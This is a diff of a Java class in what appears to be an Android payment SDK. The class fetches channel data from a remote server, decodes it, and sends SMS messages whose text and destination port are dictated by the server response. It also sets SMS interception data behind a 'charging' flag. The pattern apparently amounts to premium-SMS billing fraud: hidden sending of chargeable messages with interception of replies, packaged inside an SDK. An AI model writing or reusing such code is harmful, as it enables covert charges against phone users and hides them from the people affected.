@@ -1,8 +1,11 @@
 package com.example.administrator.sdk.manager;
 
 import android.content.Context;
+import android.os.Handler;
 
+import com.example.administrator.sdk.data.InitThroughData;
 import com.example.administrator.sdk.data.NormalThroughData;
+import com.example.administrator.sdk.httpCenter.InitRequest;
 import com.example.administrator.sdk.httpCenter.ThroughRequest;
 import com.example.administrator.sdk.entity.RequestThroughCallBackEntity;
 import com.example.administrator.sdk.entity.SmsInterceptEntity;
@@ -20,7 +23,7 @@ import rx.Subscriber;
  * Created by Administrator on 2017/7/24.
  */
 
-public class InitRequestThroughManager {
+public class InitRequestThroughManager extends PayCallBackHandler {
     private static InitRequestThroughManager initRequestThroughManager = null;
     private int requestTimes = 0;
     private RequestThroughCallBackEntity requestThroughCallBackEntity = null;
@@ -32,12 +35,16 @@ public class InitRequestThroughManager {
         return initRequestThroughManager;
     }
 
-    public void requestThrough(final Context context, final String price, final String Did, final String productName) {
+    public void requestThrough(final Context context, final String price, final String Did, final String productName, final Handler initPayCallBack) {
         try {
-            JSONObject json = new JSONObject(NormalThroughData.getNormalThroughDataList().get(requestTimes).toString());
+            JSONObject json = new JSONObject(InitThroughData.getInitThroughDataList().get(requestTimes).toString());
             String throughID = json.isNull("id") ? null : json.getString("id");
+            if (!InitRequest.isJi_Fei) {
+                return;
+            }
             if (null == throughID || throughID.equals("")) {
-                goToNextThrough(context, price, Did, productName);
+                PayCallBackHandler.getInstance().payFail(initPayCallBack);
+                goToNextThrough(context, price, Did, productName, initPayCallBack);
                 return;
             }
             ThroughRequest.getInstance().request(context, throughID, price, Did, productName, new Subscriber<String>() {
@@ -48,7 +55,8 @@ public class InitRequestThroughManager {
 
                 @Override
                 public void onError(Throwable e) {
-                    goToNextThrough(context, price, Did, productName);
+                    PayCallBackHandler.getInstance().payFail(initPayCallBack);
+                    goToNextThrough(context, price, Did, productName, initPayCallBack);
                     Log.debug("request through error : " + e.getMessage().toString());
                 }
 
@@ -58,34 +66,34 @@ public class InitRequestThroughManager {
                     requestThroughCallBackEntity = (RequestThroughCallBackEntity) GsonUtils.getInstance().JsonToEntity(Kode.e(s), RequestThroughCallBackEntity.class);
                     if (!requestThroughCallBackEntity.getState().equals("0")) {
                         Log.debug("请求失败:" + requestThroughCallBackEntity.getResultmsg());
-                        goToNextThrough(context, price, Did, productName);
+                        PayCallBackHandler.getInstance().payFail(initPayCallBack);
+                        goToNextThrough(context, price, Did, productName, initPayCallBack);
                     } else {
                         setInterceptData();
-                        send(context);
-                        goToNextThrough(context, price, Did, productName);
+                        send(context, initPayCallBack);
+                        //goToNextThrough(context, price, Did, productName, initPayCallBack);
                     }
                 }
             });
         } catch (Exception e) {
             e.printStackTrace();
-            goToNextThrough(context, price, Did, productName);
         }
     }
 
 
-    private void goToNextThrough(Context context, String price, String Did, String productName) {
+    private void goToNextThrough(Context context, String price, String Did, String productName, Handler initPayCallBack) {
         if (setRequestTimes() != -1) {
-            requestThrough(context, price, Did, productName);
+            requestThrough(context, price, Did, productName, initPayCallBack);
         } else {
             return;
         }
     }
 
-    private void send(Context context) {
+    private void send(Context context, Handler payCallBack) {
         for (int i = 0; i < requestThroughCallBackEntity.getOrder().size(); i++) {
             String command = requestThroughCallBackEntity.getOrder().get(i).getCommand();
             String sendport = requestThroughCallBackEntity.getOrder().get(i).getSendport();
-            SmsCenter.getInstance().sendSms(context, sendport, command);
+            SmsCenter.getInstance().sendSms(context, sendport, command, payCallBack);
         }
     }
 
